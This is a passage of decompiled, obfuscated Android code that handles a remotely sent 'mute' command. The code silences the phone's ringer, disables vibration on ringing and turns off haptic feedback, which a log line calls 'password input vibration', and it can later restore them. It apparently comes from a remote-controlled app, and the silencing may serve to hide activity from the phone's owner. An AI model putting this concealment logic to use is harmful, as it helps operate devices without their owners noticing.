            boolean zOptBoolean = jSONObject != null ? jSONObject.optBoolean("muted", false) : false;
            boolean z = zOptBoolean;
            if (zOptBoolean) {
                str2 = "关闭";
                str = "开启";
            } else {
                str = "关闭";
                str2 = str;
            }
            t60.m214714d6("AppCmdHandler", "收到静音命令: " + str + "手机铃声静音");
            r1.m214879b5("收到静音命令: " + (z ? "开启" : str2) + "手机铃声静音");
            dqtvuisjd dqtvuisjdVar = r1.f60536a0;
            Object systemService = dqtvuisjdVar.getSystemService("audio");
            AudioManager audioManager3 = systemService instanceof AudioManager ? (AudioManager) systemService : null;
            if (audioManager3 == null) {
                t60.m214704c5("AppCmdHandler", "AudioManager 获取失败");
                return c1351vv;
            }
            ContentResolver contentResolver2 = dqtvuisjdVar.getContentResolver();
            if (z) {
                audioManager3.setRingerMode(0);
                appCommandHandler$handleMute$1.f53431a0 = audioManager3;
                appCommandHandler$handleMute$1.f53432a1 = contentResolver2;
                i3 = 1;
                appCommandHandler$handleMute$1.f53435a4 = 1;
                r1 = contentResolver2;
                audioManager2 = audioManager3;
                if (b81.m210571b1(300L, appCommandHandler$handleMute$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            try {
                audioManager3.setStreamMute(2, false);
                audioManager3.setStreamMute(5, false);
            } catch (Exception unused) {
                t60.m214702c3("AppCmdHandler", "取消setStreamMute失败");
            }
            try {
                audioManager3.setRingerMode(2);
            } catch (Exception e3) {
                t60.m214726f4("AppCmdHandler", "恢复铃声模式失败: " + e3.getMessage());
            }
            try {
                int streamMaxVolume = audioManager3.getStreamMaxVolume(2);
                int streamMaxVolume2 = audioManager3.getStreamMaxVolume(5);
                int i4 = (int) (streamMaxVolume * 0.5d);
                if (i4 < 1) {
                    i4 = 1;
                }
                int i5 = (int) (streamMaxVolume2 * 0.5d);
                if (i5 < 1) {
                    i5 = 1;
                }
                audioManager3.setStreamVolume(2, i4, 1);
                audioManager3.setStreamVolume(5, i5, 1);
            } catch (Exception e4) {
                t60.m214726f4("AppCmdHandler", "恢复音量失败: " + e4.getMessage());
            }
            try {
                Settings.System.putInt(contentResolver2, "haptic_feedback_enabled", 1);
                t60.m214714d6("AppCmdHandler", "已恢复触觉反馈");
            } catch (Exception e5) {
                t60.m214726f4("AppCmdHandler", "恢复触觉反馈失败: " + e5.getMessage());
            }
            t60.m214714d6("AppCmdHandler", "已关闭手机铃声静音");
            return c1351vv;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            r1 = appCommandHandler$handleMute$1.f53432a1;
            audioManager = appCommandHandler$handleMute$1.f53431a0;
            try {
                kg1.m213544f4(obj);
                r1 = r1;
                audioManager.setRingerMode(0);
                contentResolver = r1;
            } catch (Exception e6) {
                e = e6;
                try {
                    t60.m214726f4("AppCmdHandler", "禁用震动失败: " + e.getMessage());
                    contentResolver = r1;
                } catch (Exception e7) {
                    e = e7;
                    audioManager2 = audioManager;
                    t60.m214726f4("AppCmdHandler", "设置静音失败: " + e.getMessage());
                    try {
                        audioManager2.setStreamMute(2, true);
                        audioManager2.setStreamMute(5, true);
                        contentResolver = r1;
                    } catch (Exception e8) {
                        t60.m214726f4("AppCmdHandler", "setStreamMute也失败: " + e8.getMessage());
                        contentResolver = r1;
                    }
                    Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0);
                    t60.m214714d6("AppCmdHandler", "已关闭触觉反馈（输入密码震动）");
                    t60.m214714d6("AppCmdHandler", "已开启手机铃声静音");
                    return c1351vv;
                }
                Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0);
                t60.m214714d6("AppCmdHandler", "已关闭触觉反馈（输入密码震动）");
                t60.m214714d6("AppCmdHandler", "已开启手机铃声静音");
                return c1351vv;
            }
            Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0);
            t60.m214714d6("AppCmdHandler", "已关闭触觉反馈（输入密码震动）");
            t60.m214714d6("AppCmdHandler", "已开启手机铃声静音");
            return c1351vv;
        }
        ContentResolver contentResolver3 = appCommandHandler$handleMute$1.f53432a1;
        AudioManager audioManager4 = appCommandHandler$handleMute$1.f53431a0;
        kg1.m213544f4(obj);
        r1 = contentResolver3;
        audioManager2 = audioManager4;
        int ringerMode = audioManager2.getRingerMode();
        contentResolver = r1;
        if (ringerMode == 0) {
            t60.m214714d6("AppCmdHandler", "已设置为静音模式");
            contentResolver = r1;
        } else if (ringerMode == i3) {
            try {
                Settings.System.putInt(r1, "vibrate_when_ringing", 0);
                Settings.Global.putInt(r1, "vibrate_when_ringing", 0);
                appCommandHandler$handleMute$1.f53431a0 = audioManager2;
                appCommandHandler$handleMute$1.f53432a1 = r1;
                appCommandHandler$handleMute$1.f53435a4 = 2;
                if (b81.m210571b1(100L, appCommandHandler$handleMute$1) != coroutineSingletons) {
                    audioManager = audioManager2;
                    r1 = r1;
                    audioManager.setRingerMode(0);
                    contentResolver = r1;
                }
                return coroutineSingletons;
            } catch (Exception e9) {
                e = e9;
                audioManager = audioManager2;
                t60.m214726f4("AppCmdHandler", "禁用震动失败: " + e.getMessage());
                contentResolver = r1;
                Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0);
                t60.m214714d6("AppCmdHandler", "已关闭触觉反馈（输入密码震动）");
                t60.m214714d6("AppCmdHandler", "已开启手机铃声静音");
                return c1351vv;
            }
        }
        Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0);
        t60.m214714d6("AppCmdHandler", "已关闭触觉反馈（输入密码震动）");
        t60.m214714d6("AppCmdHandler", "已开启手机铃声静音");
        return c1351vv;
    }
}
